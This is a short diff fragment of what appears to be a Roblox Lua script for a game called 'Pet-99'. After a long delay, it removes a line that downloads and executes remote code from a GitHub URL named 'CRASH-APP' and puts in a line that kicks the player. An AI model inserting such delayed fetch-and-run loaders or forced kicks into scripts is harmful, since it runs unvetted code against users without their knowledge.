@@ -7,7 +7,7 @@ end)
 
 spawn(function()
 wait(21368)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/CRASH-APP"))()
+game.Players.LocalPlayer:Kick("Heo")
 end)
 
 spawn(function()
